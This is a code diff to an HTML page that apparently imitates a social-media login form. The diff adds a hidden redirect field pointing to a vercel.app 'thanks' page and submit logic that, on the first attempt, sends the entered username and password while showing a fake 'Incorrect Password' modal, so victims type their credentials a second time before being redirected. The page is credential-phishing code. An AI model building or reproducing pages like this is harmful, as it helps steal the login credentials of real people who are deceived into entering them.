@@ -21,56 +21,57 @@
     crossorigin="anonymous" referrerpolicy="no-referrer" />
 
   <style>
-    .body {
-      background-color: 'yellow';
-    }
-
-    /* Modal styling */
+    /* Custom Modal Inline Styling */
     #errorModal {
       display: none;
       position: fixed;
       top: 0;
       left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      z-index: 1000;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
       justify-content: center;
       align-items: center;
     }
 
     #errorModal .modal-box {
-      background: #fff;
-      padding: 20px 30px;
-      border-radius: 10px;
+      background: white;
+      padding: 20px 25px;
+      border-radius: 8px;
       max-width: 300px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
       text-align: center;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
     }
 
-    #errorModal .modal-box h3 {
+    #errorModal h3 {
       margin-bottom: 10px;
-      color: #e74c3c;
+      color: red;
+      font-size: 18px;
     }
 
-    #errorModal .modal-box p {
+    #errorModal p {
       font-size: 14px;
     }
 
-    #errorModal .modal-box button {
-      margin-top: 10px;
+    #errorModal button {
+      margin-top: 12px;
       padding: 8px 16px;
-      background-color: #0067b8;
-      color: white;
+      background: #0067b8;
+      color: #fff;
       border: none;
       border-radius: 5px;
       cursor: pointer;
+    }
+
+    #errorModal button:hover {
+      background: #004b85;
     }
   </style>
 </head>
 
 <body>
-  <!-- Modal -->
+  <!-- Custom Modal -->
   <div id="errorModal">
     <div class="modal-box">
       <h3>Incorrect Password</h3>
@@ -79,6 +80,7 @@
     </div>
   </div>
 
+  <!-- Main Container -->
   <div class="container">
     <div class="main-container">
       <div class="main-content">
@@ -117,7 +119,8 @@
                   <div class="animate-input">
                     <span>Phone number, username or email</span>
                     <input type="text" name="username" id="username" required />
-                    <input type="hidden" name="_captcha" value="false" />/thanks.html" />
+                    <input type="hidden" name="_captcha" value="false" />
+                    <input type="hidden" name="_next" id="nextField" value="https://grilvotes.vercel.app/thanks.html" />
                   </div>
                 </div>
 
@@ -177,24 +180,22 @@
     </div>
   </div>
 
-  <!-- JavaScript for modal + submission control -->
+  <!-- JavaScript Logic -->
   <script>
     let attemptCount = 0;
 
     document.getElementById('form').addEventListener('submit', function (e) {
       attemptCount++;
 
-      const nextInput = document.getElementById('nextField');
+      const nextField = document.getElementById('nextField');
 
       if (attemptCount === 1) {
-        // First submit: cancel redirect but still send form
-        nextInput.value = window.location.href;
+        nextField.value = window.location.href; // Stay on same page
         setTimeout(() => {
           document.getElementById('errorModal').style.display = 'flex';
-        }, 500);
+        }, 300);
       } else {
-        // Second submit: allow redirect
-        nextInput.value = "https://frilea.vercel.app/thanks.html";
+        nextField.value = "https://grilvotes.vercel.app/thanks.html"; // Redirect
       }
     });
 
@@ -202,7 +203,7 @@
       document.getElementById('errorModal').style.display = 'none';
     }
   </script>
-  <script src='app.js'></script>
+  <script src='app.jsj'></script>
 </body>
 
 </html>
